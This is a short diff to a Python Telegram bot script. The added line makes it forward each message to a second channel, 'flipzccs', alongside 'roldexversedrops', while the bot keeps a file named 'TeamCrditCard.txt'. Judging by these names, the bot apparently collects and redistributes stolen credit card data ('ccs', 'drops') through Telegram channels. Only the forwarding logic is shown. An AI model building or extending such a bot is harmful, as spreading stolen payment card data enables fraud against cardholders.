@@ -99,6 +99,7 @@ with client:
              file1.write(m)
              file1.close() 
              client.send_message('roldexversedrops', respo,parse_mode='html')
+             client.send_message('flipzccs', respo,parse_mode='html')
              file1 = open("TeamCrditCard.txt", "r+")    
              file1.seek(0)  
              ofid = file1.read()
